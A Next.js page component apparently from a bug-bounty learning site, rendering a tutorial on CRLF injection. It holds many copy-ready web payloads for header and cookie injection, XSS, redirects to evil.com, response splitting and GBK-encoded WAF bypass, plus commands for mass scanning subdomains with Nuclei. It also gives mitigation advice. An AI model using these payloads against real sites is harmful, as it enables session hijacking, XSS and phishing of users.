"use client"

import { useState } from "react"
import Image from "next/image"
import { ContentLayout } from "@/components/content-layout"
import { CommandCard } from "@/components/command-card"
import {
  Bug, Terminal, ChevronRight, ExternalLink,
  Search, Shield, FileText, AlertTriangle, Github, BookOpen,
  Zap, Globe, XCircle,
} from "lucide-react"

const phases = [
  { id: "introduction", label: "Introduction" },
  { id: "what-is", label: "What Is CRLF?" },
  { id: "payloads", label: "Payload Examples" },
  { id: "response-splitting", label: "Response Splitting" },
  { id: "gbk-bypass", label: "GBK Bypass" },
  { id: "hunting", label: "How to Hunt" },
  { id: "payload-list", label: "Payload List" },
  { id: "mitigation", label: "Mitigation" },
]

export default function CRLFPage() {
  const [activeCategory, setActiveCategory] = useState("introduction")
  const [expandedImg, setExpandedImg] = useState<string | null>(null)

  const scrollToSection = (id: string) => {
    setActiveCategory(id)
    const element = document.getElementById(id)
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" })
    }
  }

  return (
    <ContentLayout
      pageTitle="CRLF Injection"
      breadcrumbItems={[
        { label: "Home", href: "/" },
        { label: "Web Vulnerabilities", href: "/vulnerabilities" },
        { label: "CRLF Injection" },
      ]}
      hero={{
        icon: Bug,
        title: "CRLF Injection — HTTP Header Manipulation",
        description: "Carriage Return and Line Feed injection leading to HTTP response splitting, web cache poisoning, XSS, session fixation and more",
        stats: [
          { label: "8 Phases", className: "bg-amber-500/10 text-amber-500" },
          { label: "40+ Payloads", className: "bg-orange-500/10 text-orange-500" },
          { label: "Copy Ready", className: "bg-secondary text-foreground" },
        ],
        gradient: "from-amber-500/10 via-background to-orange-500/5",
        iconBg: "bg-amber-500/10 text-amber-500",
      }}
      phases={phases}
      activeCategory={activeCategory}
      onPhaseChange={scrollToSection}
      navActiveClass="bg-amber-500 text-white"
      expandedImg={expandedImg}
      onLightboxClose={() => setExpandedImg(null)}
      onLightboxOpen={(src) => setExpandedImg(src)}
    >

          {/* Introduction */}
          <section id="introduction" className="scroll-mt-24">
            <h2 className="mb-4 text-2xl font-bold text-foreground">Introduction</h2>
            <p className="text-muted-foreground leading-relaxed">
              In web security some vulnerabilities don&apos;t get as much attention but can still cause major problems. One of these is CRLF Injection. Although it&apos;s not as well-known as SQL Injection or Cross-Site Scripting, CRLF Injection can lead to serious issues like HTTP response splitting, web cache poisoning and even XSS attacks &mdash; all of which can put a website at risk.
            </p>
          </section>

          {/* What is CRLF Injection? */}
          <section id="what-is" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
                <AlertTriangle className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-amber-500">Phase 1</span>
                <h2 className="text-2xl font-bold text-foreground">What is CRLF Injection?</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              CRLF stands for <strong className="text-foreground">C</strong>arriage <strong className="text-foreground">R</strong>eturn (<code className="rounded bg-muted px-1 py-0.5 text-xs">CR, %0d</code>) and <strong className="text-foreground">L</strong>ine <strong className="text-foreground">F</strong>eed (<code className="rounded bg-muted px-1 py-0.5 text-xs">LF, %0a</code>), which are special characters used to denote the end of a line in HTTP headers. CRLF Injection occurs when an attacker is able to inject these characters into HTTP headers or responses, manipulating how the server or client interprets the response.
            </p>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              By injecting CRLF sequences, an attacker can prematurely terminate headers and inject arbitrary headers or even body content leading to various attacks such as:
            </p>
            <ul className="mb-4 space-y-2 text-muted-foreground">
              {[
                "HTTP Response Splitting",
                "Web Cache Poisoning",
                "Cross-Site Scripting (XSS)",
                "Session Fixation",
              ].map((item) => (
                <li key={item} className="flex items-start gap-2">
                  <ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" />
                  <span>{item}</span>
                </li>
              ))}
            </ul>

            <h3 className="mb-3 text-lg font-semibold text-foreground">How Does CRLF Injection Work?</h3>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              CRLF Injection relies on the ability to inject a newline character (<code className="rounded bg-muted px-1 py-0.5 text-xs">%0d%0a</code> in URL encoding) into HTTP headers. When these characters are inserted at the wrong place in the response they can break the header structure allowing attackers to introduce custom headers or even manipulate the content of the response.
            </p>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              For example in a web application that doesn&apos;t properly sanitize user input, an attacker could inject the following payload into a field that is reflected in the HTTP response headers:
            </p>
            <CommandCard
              command="%0d%0aX-Injection-Test: injected"
              description="Basic CRLF header injection payload"
              index={1}
            />
          </section>

          {/* Real-World Payload Examples */}
          <section id="payloads" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
                <Zap className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-amber-500">Phase 2</span>
                <h2 className="text-2xl font-bold text-foreground">Real-World Payload Examples</h2>
              </div>
            </div>

            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Basic Header Injection</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                One of the simplest forms of CRLF Injection is when attackers add custom headers. This is done by injecting the <code className="rounded bg-muted px-1 py-0.5 text-xs">%0d%0a</code> sequence:
              </p>
              <CommandCard command="%0d%0aX-Injection-Test: injected" description="Inject a custom HTTP header" index={2} />
            </div>

            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Cookie Injection</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                CRLF Injection can be used to inject new cookies into the HTTP response. This is particularly dangerous when session data or other sensitive information is being managed via cookies.
              </p>
              <CommandCard command="%0d%0aSet-Cookie: hacked=true;" description="Inject a malicious cookie" index={3} />
            </div>

            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">HTML Injection</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                One of the more insidious uses of CRLF Injection is to inject HTML or JavaScript into an HTTP response, which can trigger cross-site scripting (XSS) or unwanted redirects.
              </p>
              <div className="space-y-2">
                <CommandCard command={`%0d%0a%3Ch1%3EHTML INJECTION%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E`} description="HTML injection via CRLF" index={4} />
              </div>
              <div className="mt-4 rounded-lg border border-border bg-muted p-3">
                <p className="mb-1 text-xs font-medium text-muted-foreground">Decoded HTML:</p>
                <pre className="text-sm text-foreground"><code>{`<h1>HTML INJECTION</h1>
<p>CRLF Injection PoC by coffin</p>`}</code></pre>
              </div>
              <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/crlf-injection/ec05a536c9bd7f90bdfffd822f28b0e25e6ee84e.webp")}>
                <Image src="/images/vulnerabilities/crlf-injection/ec05a536c9bd7f90bdfffd822f28b0e25e6ee84e.webp" alt="HTML injection via CRLF" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
              </div>
            </div>

            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Redirection / Phishing</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                CRLF Injection can be used to inject links that redirect users to phishing sites:
              </p>
              <CommandCard command={`%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fexample.com%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A`} description="Phishing link injection" index={5} />
              <div className="mt-3 rounded-lg border border-border bg-muted p-3">
                <p className="mb-1 text-xs font-medium text-muted-foreground">Decoded HTML:</p>
                <pre className="text-sm text-foreground"><code>{`<A HREF="https://example.com/">Login Here </A>`}</code></pre>
              </div>
            </div>

            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Injecting Dangerous HTML Elements</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                A common and dangerous use of CRLF Injection is to inject JavaScript code that executes in the victim&apos;s browser leading to XSS attacks.
              </p>
              <CommandCard command="%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E" description="XSS via img onerror" index={6} />
              <div className="mt-3 rounded-lg border border-border bg-muted p-3">
                <p className="mb-1 text-xs font-medium text-muted-foreground">Decoded HTML:</p>
                <pre className="text-sm text-foreground"><code>{`<img src=x onerror=prompt(1)>`}</code></pre>
              </div>
            </div>

            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Open Redirect</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                CRLF Injection can also be used to perform open redirect attacks by injecting a new Location header into the HTTP response. When successful this forces the browser to redirect the user to a malicious site.
              </p>
              <CommandCard command="%0d%0aLocation:%20https://evil.com" description="Open redirect via CRLF" index={7} />
            </div>

            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">XSS Injection</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                Another common use of CRLF Injection is to insert JavaScript into an HTTP response, leading to Cross-Site Scripting (XSS).
              </p>
              <CommandCard command={`%0d%0a%0d%0a<script>alert('XSS via CRLF')</script>`} description="XSS via CRLF injection" index={8} />
            </div>

            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">Redirecting with JavaScript Injection</h3>
              <CommandCard command={`%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E`} description="JavaScript redirect via CRLF" index={9} />
              <div className="mt-3 rounded-lg border border-border bg-muted p-3">
                <p className="mb-1 text-xs font-medium text-muted-foreground">Decoded:</p>
                <pre className="text-sm text-foreground"><code>{`<script>document.location.href="https://evil.com"</script>`}</code></pre>
              </div>
            </div>

            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">XSS Protection Bypass</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                A more advanced use of CRLF Injection involves disabling browser-based XSS protections by injecting custom HTTP headers. Attackers can insert the <code className="rounded bg-muted px-1 py-0.5 text-xs">X-XSS-Protection: 0</code> header, which tells the browser to ignore built-in protections against reflected XSS.
              </p>
              <CommandCard
                command={`%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E`}
                description="Disable XSS protection and inject script"
                index={10}
              />
              <div className="mt-3 rounded-lg border border-border bg-muted p-3">
                <p className="mb-1 text-xs font-medium text-m-uted-foreground">Decoded:</p>
                <pre className="text-sm text-foreground"><code>{`?
Location:
Content-Type:text/html
X-XSS-Protection:0

<script>alert(document.cookie)</script>`}</code></pre>
              </div>
              <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/crlf-injection/c4856153768d44f91589acf74e7a77dd0d8492a1.webp")}>
                <Image src="/images/vulnerabilities/crlf-injection/c4856153768d44f91589acf74e7a77dd0d8492a1.webp" alt="XSS Protection bypass" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
              </div>
            </div>

            <div className="mb-8 rounded-lg border border-border bg-card p-5">
              <h3 className="mb-2 font-semibold text-foreground">IFrame Injection</h3>
              <p className="mb-4 text-sm text-muted-foreground">
                The attacker could inject a hidden iframe to redirect users to a malicious site:
              </p>
              <CommandCard command={`%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A`} description="Hidden iframe injection" index={11} />
              <div className="mt-3 rounded-lg border border-border bg-muted p-3">
                <p className="mb-1 text-xs font-medium text-muted-foreground">Decoded:</p>
                <pre className="text-sm text-foreground"><code>{`<iframe src="https://www.nasa.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">`}</code></pre>
              </div>
            </div>
          </section>

          {/* HTTP Response Splitting */}
          <section id="response-splitting" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
                <XCircle className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-amber-500">Phase 3</span>
                <h2 className="text-2xl font-bold text-foreground">HTTP Response Splitting</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              HTTP Response Splitting is a powerful technique made possible by CRLF Injection. By injecting <code className="rounded bg-muted px-1 py-0.5 text-xs">%0d%0a</code> (Carriage Return + Line Feed), an attacker can split the server&apos;s HTTP response into two parts. This enables manipulation of headers and body content in unexpected ways.
            </p>
            <div className="mb-6 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">HTTP Request</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`/vulnerable-endpoint?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Split!')</script>`}</code></pre>
            </div>
            <ul className="mb-4 space-y-2 text-sm text-muted-foreground">
              <li className="flex items-start gap-2"><ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" /><span><code className="rounded bg-muted px-1 py-0.5 text-xs">%0d%0a</code> → Ends the current header line</span></li>
              <li className="flex items-start gap-2"><ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" /><span><code className="rounded bg-muted px-1 py-0.5 text-xs">Content-Length: 0</code> → Ends original response</span></li>
              <li className="flex items-start gap-2"><ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" /><span>A new <code className="rounded bg-muted px-1 py-0.5 text-xs">HTTP/1.1 200 OK</code> response starts with a malicious script in the body</span></li>
              <li className="flex items-start gap-2"><ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" /><span>The browser or cache may treat the second part as a new valid response</span></li>
            </ul>
          </section>

          {/* GBK Encoding Bypass */}
          <section id="gbk-bypass" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
                <Shield className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-amber-500">Phase 4</span>
                <h2 className="text-2xl font-bold text-foreground">Bypass Technique — GBK Encoding</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              When basic CRLF payloads like the following get blocked by WAF:
            </p>
            <CommandCard command="/%0D%0ASet-Cookie:whoami=coffinxp" description="Basic CRLF payload (often blocked)" index={12} />
            <p className="mb-4 text-muted-foreground leading-relaxed">
              You can bypass the firewall using GBK-encoded characters that act like CR and LF. In GBK encoding:
            </p>
            <div className="mb-4 inline-flex flex-wrap gap-2">
              <span className="rounded-md bg-muted px-3 py-1 text-sm font-mono text-foreground">嘍 = %E5%98%8D (CR)</span>
              <span className="rounded-md bg-muted px-3 py-1 text-sm font-mono text-foreground">嘊 = %E5%98%8A (LF)</span>
            </div>

            <h3 className="mb-3 mt-6 text-lg font-semibold text-foreground">Bypass Payload</h3>
            <CommandCard
              command="https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=coffinxp"
              description="GBK-encoded CRLF bypass payload"
              index={13}
            />
            <p className="mt-3 mb-6 text-sm text-muted-foreground">
              This payload bypasses standard filtering and successfully injects a custom header like: <code className="rounded bg-muted px-1 py-0.5 text-xs">Set-Cookie: crlfinjection=coffinxp</code>
            </p>

            <h3 className="mb-3 text-lg font-semibold text-foreground">XSS Chaining (GBK-encoded &lt;script&gt;)</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              To escalate CRLF to XSS: <code className="rounded bg-muted px-1 py-0.5 text-xs">&lt; = 嘼 = %E5%98%BC</code>, <code className="rounded bg-muted px-1 py-0.5 text-xs">&gt; = 嘾 = %E5%98%BE</code>
            </p>
            <CommandCard
              command={`https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:whoami=coffinxp%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE`}
              description="Full CRLF to XSS via GBK encoding"
              index={14}
            />
            <a
              href="https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows"
              target="_blank"
              rel="noopener noreferrer"
              className="mt-4 inline-flex items-center gap-2 rounded-lg bg-amber-500/10 px-4 py-2 text-sm font-medium text-amber-500 hover:bg-amber-500/20"
            >
              <BookOpen className="h-4 w-4" />
              PortSwigger — Unicode Overflows
              <ExternalLink className="h-3 w-3" />
            </a>
          </section>

          {/* How to Hunt */}
          <section id="hunting" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
                <Search className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-amber-500">Phase 5</span>
                <h2 className="text-2xl font-bold text-foreground">How to Hunt for CRLF Injection</h2>
              </div>
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Using cURL</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              One of the easiest ways to test for CRLF Injection is by using cURL. It allows you to send custom requests and observe how the server handles special characters.
            </p>
            <CommandCard
              command={`curl -I "https://example.com/%0d%0aSet-Cookie:crlf=injected;"`}
              description="Test CRLF injection with cURL"
              index={15}
            />
            <div className="mt-4 mb-6 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Response</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`HTTP/2 301
date: Mon, 12 May 2025 12:46:42 GMT
content-type: text/html
location: https://example.com/
set-cookie: crlf=injected;`}</code></pre>
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Automate with Nuclei</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              You can also use my custom Nuclei template to easily detect CRLF injection vulnerabilities at scale across multiple target domains.
            </p>
            <div className="space-y-2">
              <CommandCard command="nuclei -u https://target.com -t cRlf.yaml" description="Scan a single URL for CRLF" index={16} />
              <CommandCard command="subfinder -d domain.com -all | nuclei -t cRlf.yaml" description="Mass CRLF scan across subdomains" index={17} />
            </div>
            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/crlf-injection/967f9969bf8f4e33834517c036cb4305a56225c2.webp")}>
              <Image src="/images/vulnerabilities/crlf-injection/967f9969bf8f4e33834517c036cb4305a56225c2.webp" alt="Nuclei CRLF scan" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
            <a
              href="https://github.com/coffinxp/nuclei-templates/blob/main/cRlf.yaml"
              target="_blank"
              rel="noopener noreferrer"
              className="mt-4 inline-flex items-center gap-2 rounded-lg bg-amber-500/10 px-4 py-2 text-sm font-medium text-amber-500 hover:bg-amber-500/20"
            >
              <Github className="h-4 w-4" />
              coffinxp/nuclei-templates — cRlf.yaml
              <ExternalLink className="h-3 w-3" />
            </a>

            <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Using Loxs Tool</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              You can also use our Loxs tool to perform mass scanning for CRLF injection vulnerabilities across multiple targets quickly and efficiently.
            </p>
            <div className="mb-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/crlf-injection/80ae95d59c14afa2153bf701a76665d23fb752b2.webp")}>
              <Image src="/images/vulnerabilities/crlf-injection/80ae95d59c14afa2153bf701a76665d23fb752b2.webp" alt="Loxs CRLF scanning" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
            <a
              href="https://github.com/coffinxp/loxs"
              target="_blank"
              rel="noopener noreferrer"
              className="mb-8 inline-flex items-center gap-2 rounded-lg bg-amber-500/10 px-4 py-2 text-sm font-medium text-amber-500 hover:bg-amber-500/20"
            >
              <Github className="h-4 w-4" />
              coffinxp/loxs
              <ExternalLink className="h-3 w-3" />
            </a>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Nuclei Template vs Crlfuzz</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              You&apos;ll notice the difference &mdash; my Nuclei template detects more vulnerable domains compared to the Crlfuzz tool, making it more effective for large-scale CRLF injection hunting.
            </p>
            <div className="mb-6 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/crlf-injection/61242f687698d3be4d7e09f959e3045737144d3f.webp")}>
              <Image src="/images/vulnerabilities/crlf-injection/61242f687698d3be4d7e09f959e3045737144d3f.webp" alt="Nuclei vs Crlfuzz comparison" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Using Burp Suite</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              Burp Suite makes it easy to detect CRLF Injection by observing how the server responds to special newline characters in request parameters.
            </p>
            <ul className="mb-4 space-y-2 text-sm text-muted-foreground">
              <li className="flex items-start gap-2"><span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-amber-500/10 text-xs font-bold text-amber-500">1</span><span>Intercept a request using Burp (e.g., a GET request with a query parameter like <code className="rounded bg-muted px-1 py-0.5 text-xs">?page=home</code>).</span></li>
              <li className="flex items-start gap-2"><span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-amber-500/10 text-xs font-bold text-amber-500">2</span><span>Send the request to Repeater.</span></li>
              <li className="flex items-start gap-2"><span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-amber-500/10 text-xs font-bold text-amber-500">3</span><span>Modify a parameter by injecting CRLF sequences like: <code className="rounded bg-muted px-1 py-0.5 text-xs">home%0d%0aSet-Cookie:injected=1</code>.</span></li>
              <li className="flex items-start gap-2"><span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-amber-500/10 text-xs font-bold text-amber-500">4</span><span>Observe the response &mdash; look for new headers or broken layout.</span></li>
            </ul>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Advanced Tips</h3>
            <div className="mb-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/crlf-injection/5d091ae3689bf204291394d19ae0d3aa92ff55e0.webp")}>
              <Image src="/images/vulnerabilities/crlf-injection/5d091ae3689bf204291394d19ae0d3aa92ff55e0.webp" alt="Advanced CRLF tips" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
          </section>

          {/* Payload List */}
          <section id="payload-list" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
                <Terminal className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-amber-500">Phase 6</span>
                <h2 className="text-2xl font-bold text-foreground">Complete Payload List</h2>
              </div>
            </div>
            <div className="mb-6 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">CRLF Payloads</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`/%%0a0aSet-Cookie:coffin=hi
/%0aSet-Cookie:coffin=hi;
/%0aSet-Cookie:coffin=hi
/%0d%0aLocation: http://evil.com
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
/%0d%0a%0d%0a<script>alert('XSS')</script>;
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('XSS');</script>
/%0d%0aHost: {{Hostname}}%0d%0aCookie: coffin=hi%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: coffin=hi%0d%0a%0d%0a
/%0d%0aLocation: www.evil.com
/%0d%0aSet-Cookie:coffin=hi;
/%0aSet-Cookie:coffin=hi
/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>
/%23%0aSet-Cookie:coffin=hi
/%25%30%61Set-Cookie:coffin=hi
/%2e%2e%2f%0d%0aSet-Cookie:coffin=hi
/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr
/%3f%0d%0aLocation:%0d%0acoffin-x:coffin-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>
/%5Cr%20Set-Cookie:coffin=hi;
/%5Cr%5Cn%20Set-Cookie:coffin=hi;
/%5Cr%5Cn%5CtSet-Cookie:coffin%5Cr%5CtSet-Cookie:coffin=hi;
/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:coffin=hi;
/%E5%98%8A%E5%98%8DLocation:www.evil.com
/%E5%98%8D%E5%98%8ALocation:www.evil.com
/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi
/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi;
/%E5%98%8D%E5%98%8ASet-Cookie:coffinxp=coffinxp
/%u000ASet-Cookie:coffin=hi;
/www.evil.com/%2E%2E%2F%0D%0Acoffin-x:coffin-x
/www.evil.com/%2F..%0D%0Acoffin-x:coffin-x`}</code></pre>
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Resources</h3>
            <div className="flex flex-wrap gap-3">
              <a
                href="https://book.hacktricks.wiki/en/pentesting-web/crlf-0d-0a.html"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center gap-1 rounded-md bg-card border border-border px-3 py-1.5 text-xs text-foreground hover:border-amber-500/50"
              >
                <BookOpen className="h-3 w-3" />
                HackTricks CRLF
              </a>
              <a
                href="https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center gap-1 rounded-md bg-card border border-border px-3 py-1.5 text-xs text-foreground hover:border-amber-500/50"
              >
                <BookOpen className="h-3 w-3" />
                PortSwigger — Response Queue Poisoning
              </a>
            </div>
          </section>

          {/* Mitigation */}
          <section id="mitigation" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
                <Shield className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-amber-500">Phase 7</span>
                <h2 className="text-2xl font-bold text-foreground">Mitigation & Prevention</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              To prevent CRLF Injection attacks, developers should:
            </p>
            <ul className="mb-6 space-y-3 text-muted-foreground">
              <li className="flex items-start gap-2">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-amber-500/10 text-xs font-bold text-amber-500">1</span>
                <span><strong className="text-foreground">Sanitize and Validate Input:</strong> Ensure that any user input that can be reflected in HTTP headers is properly sanitized. This includes stripping out <code className="rounded bg-muted px-1 py-0.5 text-xs">\r</code> (Carriage Return) and <code className="rounded bg-muted px-1 py-0.5 text-xs">\n</code> (Line Feed) characters.</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-amber-500/10 text-xs font-bold text-amber-500">2</span>
                <span><strong className="text-foreground">Use Safe Functions for Header Manipulation:</strong> Avoid manually constructing headers. Use secure and well-tested libraries to handle HTTP header construction to prevent accidental injection.</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-amber-500/10 text-xs font-bold text-amber-500">3</span>
                <span><strong className="text-foreground">Output Encoding:</strong> Encode special characters in user input, especially when displaying data in HTTP headers to prevent the insertion of malicious content.</span>
              </li>
            </ul>
          </section>

          {/* Conclusion */}
          <section className="scroll-mt-24">
            <div className="rounded-xl border border-amber-500/20 bg-gradient-to-br from-amber-500/5 via-background to-orange-500/5 p-8">
              <h2 className="mb-4 text-2xl font-bold text-foreground text-center">Conclusion</h2>
              <p className="text-center text-muted-foreground leading-relaxed max-w-3xl mx-auto">
                CRLF Injection is a hidden yet powerful vulnerability that can lead to serious issues like XSS, header injection and HTTP response splitting. By understanding how CR and LF characters are interpreted by servers and testing with crafted payloads, you can uncover and fix these flaws to keep your web applications secure.
              </p>
            </div>
          </section>

          {/* Tools & Resources */}
          <section className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
                <ExternalLink className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-amber-500">Tools</span>
                <h2 className="text-2xl font-bold text-foreground">Tools & Resources</h2>
              </div>
            </div>
            <div className="grid gap-3 sm:grid-cols-2">
              <a href="https://github.com/coffinxp/nuclei-templates/blob/main/cRlf.yaml" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-amber-500/50 hover:shadow-lg hover:shadow-amber-500/5">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-amber-500/10 text-amber-500">
                  <Bug className="h-4 w-4" />
